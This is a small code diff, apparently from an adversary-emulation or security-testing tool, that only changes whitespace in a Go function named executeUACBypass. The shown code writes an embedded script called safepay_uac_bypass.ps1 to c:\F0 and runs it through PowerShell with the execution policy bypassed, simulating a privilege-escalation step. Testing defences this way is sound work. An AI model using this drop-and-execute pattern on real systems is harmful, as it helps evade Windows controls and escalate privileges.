@@ -35,13 +35,13 @@ func executeUACBypass() error {
 	// Drop the PowerShell script to c:\F0
 	targetDir := "c:\\F0"
 	os.MkdirAll(targetDir, 0755)
-	
+
 	scriptPath := filepath.Join(targetDir, "safepay_uac_bypass.ps1")
 	err := os.WriteFile(scriptPath, safepayScript, 0644)
 	if err != nil {
 		return err
 	}
-	
+
 	// Execute the PowerShell script with bypass
 	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
 	_, err = cmd.Output()
